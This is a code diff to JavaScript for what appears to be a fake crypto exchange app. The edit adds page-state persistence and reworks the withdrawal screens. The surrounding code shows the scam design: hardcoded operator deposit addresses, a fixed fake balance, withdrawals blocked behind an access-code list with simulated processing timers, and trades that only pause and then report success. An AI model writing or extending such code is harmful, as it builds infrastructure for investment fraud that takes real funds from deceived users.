@@ -17,13 +17,14 @@ const validCodes = [
 ];
 let sendAttempts = 0;
 
-// Deposit addresses (per network)
 const depositAddresses = {
   "Bitcoin":   { addr: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu", label: "Bitcoin [BTC] Native" },
   "Ethereum":  { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "Ethereum [ERC-20]" },
   "BNB":       { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "BNB Smart Chain [BEP20]" },
   "Tron":      { addr: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco", label: "Tron [TRC-20]" }
 };
+const PAGE_STATE_KEY = 'autoTrade_lastPage';
+const PAGE_STATE_ACTIVITY_KEY = 'autoTrade_lastPageActivity';
 
 // ========== STORAGE KEYS ==========
 const LS = {
@@ -64,6 +65,16 @@ function formatCountdown(s) {
   let d = Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60), sec=(s%60);
   return `${d>0?d+"d ":""}${h}h ${m}m ${sec}s`;
 }
+function setLastPage(page, activity = "") {
+  saveLS(PAGE_STATE_KEY, page);
+  saveLS(PAGE_STATE_ACTIVITY_KEY, activity);
+}
+function getLastPage() {
+  return getLS(PAGE_STATE_KEY, null);
+}
+function getLastPageActivity() {
+  return getLS(PAGE_STATE_ACTIVITY_KEY, null);
+}
 
 // ========== APP STATE ==========
 let app = {
@@ -81,6 +92,7 @@ let app = {
   marketTop: [],
   isLoading: false
 };
+// Load all persistent state
 function loadAppState() {
   app.user = getLS(LS.user,null);
   app.walletMap = getLS(LS.walletMap,{});
@@ -96,14 +108,29 @@ function loadAppState() {
 }
 
 // ========== PAGE NAV ==========
-function switchPage(pageId) {
+function switchPage(pageId, activityState = null, skipPersist = false) {
   $all('.page').forEach(p => p.classList.add('hidden'));
   $('#' + pageId).classList.remove('hidden');
+  if (!skipPersist) setLastPage(pageId, activityState || "");
   if (pageId === 'markets') loadMarkets();
   if (pageId === 'home') createTV('tvchart','BINANCE:BTCUSDT');
   if (pageId === 'trade') createTV('tradeChart','BINANCE:BTCUSDT');
   if (pageId === 'futures') createTV('futuresChart','BINANCE:BTCUSDT');
+  if (activityState === "withdrawalProcessing") restoreWithdrawProcessingModal();
+  if (activityState === "withdrawalSuccess") restoreWithdrawSuccessModal();
 }
+
+window.addEventListener('popstate', function(e) {
+  let lastPage = getLastPage();
+  let lastActivity = getLastPageActivity();
+  if (lastPage) switchPage(lastPage, lastActivity, true);
+});
+
+function goBackPage() {
+  window.history.back();
+}
+
+// Footer nav
 $all('.tab').forEach(t=>t.addEventListener('click',()=>{
   const tgt=t.dataset.target; switchPage(tgt);
   $all('.tab').forEach(x=>x.classList.remove('tab-active','opacity-100'));
@@ -201,22 +228,38 @@ $('#loadSymbol').addEventListener('click', ()=> {
 });
 
 // ========== INITIAL LOAD ==========
-(async function init(){
+(function init(){
   loadAppState();
+  let lastPage = getLastPage();
+  let lastActivity = getLastPageActivity();
+  // Set wallet/account info if logged in
   if (app.user?.accountId) {
     $('#walletId').innerText = app.user.accountId;
     $('#walletId2').innerText = app.user.accountId;
   }
   $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
   $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
-  await loadUsdt();
-  await loadMarkets();
+  loadUsdt(); loadMarkets();
   setInterval(loadMarkets, 60000);
   setInterval(loadUsdt, 60000);
   handleMarketNotif();
-  if (app.user?.accountId) switchPage('home');
+  // Restore last page/activity on load
+  if (lastPage) switchPage(lastPage, lastActivity, true);
+  else if (app.user?.accountId) switchPage('home');
   else switchPage('landingPage');
 })();
+
+// ========== WITHDRAWAL MODAL RESTORE ==========
+function restoreWithdrawProcessingModal() {
+  let withdrawals = getLS(LS.withdraws, []);
+  let ongoing = withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end);
+  if (ongoing.length) showWithdrawProcessing(ongoing[ongoing.length-1]);
+}
+function restoreWithdrawSuccessModal() {
+  let withdrawals = getLS(LS.withdraws, []);
+  let completed = withdrawals.filter(wd=>wd.status==="completed");
+  if (completed.length) showWithdrawSuccessModal(completed[completed.length-1]);
+}
 
 // ========== INSTALL PROMPT ==========
 document.getElementById('getMobileAppBtn').onclick = function() {
@@ -426,66 +469,31 @@ $('#copyDepAddr').onclick = function() {
 $('#closeDepositAddrModal').onclick = function() { hide($('#depositAddressModal')); };
 
 // ========== WITHDRAW ==========
-$('#withdrawBtn').onclick = function() {
-  // Binance-style footer selection modal for withdrawal
-  $('#withdrawSheet').innerHTML = `
-    <div class="footer-binance">
-      <button id="onChainTransferBtn">On-Chain Transfer</button>
-      <button id="userAccountIdBtn">User Account ID</button>
-      <button id="closeWithdrawSheet">Cancel</button>
-    </div>
-  `;
-  show($('#withdrawSheet'));
-  $('#onChainTransferBtn').onclick = function() {
-    hide($('#withdrawSheet'));
-    $('#wdAddr').value = '';
-    $('#wdAmt').value = '';
-    $('#wdDetailMsg').innerText = "";
-    $('#wdNetwork').value = "";
-    $('#gasFeeLabel').innerText = "0.034 BNB";
-    showWithdrawDetailsPage();
-  };
-  $('#userAccountIdBtn').onclick = function() {
-    alert("Your Account ID: " + (app.user?.accountId || ""));
-  };
-  $('#closeWithdrawSheet').onclick = function() { hide($('#withdrawSheet')); };
-};
-function showWithdrawDetailsPage() {
+$('#withdrawBtn').onclick = function() { show($('#withdrawSheet')); setLastPage('home'); };
+$('#closeWithdrawSheet').onclick = function() { hide($('#withdrawSheet')); };
+$('#onChainTransferBtn').onclick = function() {
+  hide($('#withdrawSheet'));
+  $('#wdAddr').value = '';
+  $('#wdAmt').value = '';
+  $('#wdDetailMsg').innerText = "";
+  $('#wdNetwork').value = "Ethereum";
   show($('#withdrawDetailModal'));
-  $('#fillFromWallet').onclick = function() {
-    $('#wdAddr').value = app.user?.address || "";
-  };
-  $('#selectNetworkBtn').onclick = function() {
-    showNetworkSelection();
-  };
-  $('#wdMaxBtn').onclick = function() {
-    $('#wdAmt').value = TOTAL_BALANCE;
-  };
-  $('#closeWithdrawDetail').onclick = function() { hide($('#withdrawDetailModal')); };
-  $('#wdSubmitBtn').onclick = function() {
-    let addr = $('#wdAddr').value.trim();
-    let amt = parseFloat($('#wdAmt').value);
-    let net = $('#wdNetwork').value.trim();
-    if (!addr || isNaN(amt) || amt<=0 || !net) { $('#wdDetailMsg').innerText="Enter valid address, amount and network"; return; }
-    hide($('#withdrawDetailModal'));
-    $('#wdCodeInput').value = ""; $('#wdCodeMsg').innerText="";
-    show($('#withdrawCodeModal'));
-  };
-}
-function showNetworkSelection() {
-  let sel = document.createElement('div');
-  sel.className = 'network-select-modal';
-  ["Etc Ethereum network","BTC Bitcoin network","BNB Smart Chain BEP20 Network","Tron TRC 20 network"].forEach(n => {
-    let btn = document.createElement('button');
-    btn.innerText = n;
-    btn.onclick = function() {
-      $('#wdNetwork').value = n;
-      document.body.removeChild(sel);
-    };
-    sel.appendChild(btn);
-  });
-  document.body.appendChild(sel);
-}
+};
+$('#fillFromWallet').onclick = function() {
+  $('#wdAddr').value = app.user?.address || "";
+};
+$('#wdMaxBtn').onclick = function() {
+  $('#wdAmt').value = TOTAL_BALANCE;
+};
+$('#closeWithdrawDetail').onclick = function() { hide($('#withdrawDetailModal')); };
+$('#wdSubmitBtn').onclick = function() {
+  let addr = $('#wdAddr').value.trim();
+  let amt = parseFloat($('#wdAmt').value);
+  if (!addr || isNaN(amt) || amt<=0) { $('#wdDetailMsg').innerText="Enter valid address and amount"; return; }
+  hide($('#withdrawDetailModal'));
+  $('#wdCodeInput').value = ""; $('#wdCodeMsg').innerText="";
+  show($('#withdrawCodeModal'));
+};
 $('#closeWithdrawCode').onclick = function() { hide($('#withdrawCodeModal')); };
 
 $('#wdCodeSubmit').onclick = async function() {
@@ -508,11 +516,14 @@ $('#wdCodeSubmit').onclick = async function() {
     let withdrawals = getLS(LS.withdraws, []);
     withdrawals.push(wd);
     saveLS(LS.withdraws, withdrawals);
+
     let txs = getLS(LS.transactions, []);
     txs.push({type:'withdraw', ...wd});
     saveLS(LS.transactions, txs);
+
     hide($('#withdrawCodeModal'));
     showWithdrawProcessing(wd);
+    setLastPage('home', 'withdrawalProcessing');
     renderOngoingWithdrawals();
   } else {
     sendAttempts++;
@@ -547,12 +558,8 @@ function showWithdrawProcessing(wd) {
       });
       saveLS(LS.withdraws, withdrawals);
       $('#usdtPrice').innerText = fmtUsd(0.0680);
-      $('#wsDetails').innerHTML = `
-        <div>Address: ${wd.address}</div>
-        <div>Amount: ${fmtUsd(wd.amount)}</div>
-        <div>Network: ${wd.network}</div>
-      `;
-      show($('#withdrawSuccessModal'));
+      showWithdrawSuccessModal(wd);
+      setLastPage('home', 'withdrawalSuccess');
       renderOngoingWithdrawals();
     }
   }
@@ -563,17 +570,31 @@ function showWithdrawProcessing(wd) {
   $('#wpCloseBtn').onclick = function() {
     hide($('#withdrawProcessModal'));
     clearInterval(timer);
+    setLastPage('home');
   };
   $('#wpViewDetails').onclick = function() {
     switchPage('home');
     hide($('#withdrawProcessModal'));
+    setLastPage('home', 'withdrawalProcessing');
     setTimeout(renderOngoingWithdrawals, 100);
   };
 }
-$('#wsCloseBtn').onclick = function() {
-  hide($('#withdrawSuccessModal'));
-  renderOngoingWithdrawals();
-};
+
+function showWithdrawSuccessModal(wd) {
+  $('#wsDetails').innerHTML = `
+    <div>Address: ${wd.address}</div>
+    <div>Amount: ${fmtUsd(wd.amount)}</div>
+    <div>Network: ${wd.network}</div>
+  `;
+  show($('#withdrawSuccessModal'));
+  $('#wsCloseBtn').onclick = function() {
+    hide($('#withdrawSuccessModal'));
+    setLastPage('home');
+    renderOngoingWithdrawals();
+  };
+}
+
+// ========== PAGE ACTIVITY RESTORE  ==========
 function renderOngoingWithdrawals() {
   const ongoing = (getLS(LS.withdraws, []) || []).filter(wd => wd.status === "processing" && now() < wd.end);
   let list = ongoing.map(wd => {
@@ -615,15 +636,17 @@ $('#swapBtn').onclick = ()=>alert("Swap flow (demo)");
 // ========== TRADE PAGE ==========
 $('#placeOrderBtn').onclick = function() {
   show($('#tradeModal'));
+  setLastPage('trade');
 };
-$('#closeTradeModal').onclick = function() { hide($('#tradeModal')); };
+$('#closeTradeModal').onclick = function() { hide($('#tradeModal')); setLastPage('trade'); };
 $('#placeTradeBtn').onclick = function() {
   $('#tradeAssetList').innerHTML = app.marketTop.slice(0,10).map(c=>`
     <div class="flex items-center gap-2 p-2 cursor-pointer trade-asset-row" data-symbol="${c.symbol.toUpperCase()}"><img src="${c.image}" class="w-5 h-5"/>${c.name}</div>
   `).join('');
   show($('#tradeAssetModal'));
+  setLastPage('trade');
 };
-$('#closeTradeAssetModal').onclick = function() { hide($('#tradeAssetModal')); };
+$('#closeTradeAssetModal').onclick = function() { hide($('#tradeAssetModal')); setLastPage('trade'); };
 $('#tradeAssetList').onclick = function(e) {
   let row = e.target.closest('.trade-asset-row');
   if (!row) return;
@@ -631,12 +654,14 @@ $('#tradeAssetList').onclick = function(e) {
   $('#tradeOrderAsset').innerText = "Asset: "+asset;
   $('#tradeDurSelect').value = "";
   show($('#tradeDurModal'));
+  setLastPage('trade');
 };
 $('#tradeDurConfirm').onclick = function() {
   let dur = $('#tradeDurSelect').value;
   if (!dur) return;
   $('#tradeOrderDur').innerText = "Duration: "+dur+" months";
   show($('#tradePlaceOrderModal'));
+  setLastPage('trade');
 };
 $('#tradeOrderBtn').onclick = async function() {
   await sleep(15000);
@@ -644,16 +669,18 @@ $('#tradeOrderBtn').onclick = async function() {
   app.tradePositions.push(pos); saveLS(LS.tradePositions, app.tradePositions);
   hide($('#tradePlaceOrderModal'));
   alert("Trade activated!");
+  setLastPage('trade');
 };
-$('#tradeTransferBtn').onclick = function() { show($('#tradeTransferModal')); };
-$('#closeTransferModal').onclick = function() { hide($('#tradeTransferModal')); };
+$('#tradeTransferBtn').onclick = function() { show($('#tradeTransferModal')); setLastPage('trade'); };
+$('#closeTransferModal').onclick = function() { hide($('#tradeTransferModal')); setLastPage('trade'); };
 $('#transferBtn').onclick = async function() {
   await sleep(15000);
   alert("Transfer processed!");
   hide($('#tradeTransferModal'));
+  setLastPage('trade');
 };
-$('#viewEarningsBtn').onclick = function() { show($('#tradeEarningsModal')); };
-$('#closeTradeEarningsModal').onclick = function() { hide($('#tradeEarningsModal')); };
+$('#viewEarningsBtn').onclick = function() { show($('#tradeEarningsModal')); setLastPage('trade'); };
+$('#closeTradeEarningsModal').onclick = function() { hide($('#tradeEarningsModal')); setLastPage('trade'); };
 
 // ========== SETTINGS ==========
 $('#settingsBtn').onclick = function() { switchPage('settingsPage'); };
@@ -665,6 +692,7 @@ $('#closeAccountBtn').onclick = async function() {
   delLS(LS.user); app.user=null;
   switchPage('landingPage');
 };
+// Theme
 $('#themeSelect').onchange = function() {
   app.theme = this.value; saveLS(LS.theme, app.theme);
   document.body.className = app.theme==="light"?"bg-white text-black":"bg-black text-white";
@@ -695,9 +723,13 @@ $('#notifList').innerText = app.notifMsgs.slice(-10).map(msg=>"<div>"+msg+"</div
 
 // ========== TRANSACTIONS / ACTIVITY ==========
 $('#transactionsBtn').onclick = function() {
+  switchPage('home');
+  renderOngoingWithdrawals();
   alert("Show transactions (demo). List: "+JSON.stringify(app.transactions));
 };
 $('#activityBtn').onclick = function() {
+  switchPage('home');
+  renderOngoingWithdrawals();
   alert("Show activity (demo). List: "+JSON.stringify(app.transactions));
 };
 $('#disconnectBtn').onclick = async function() {
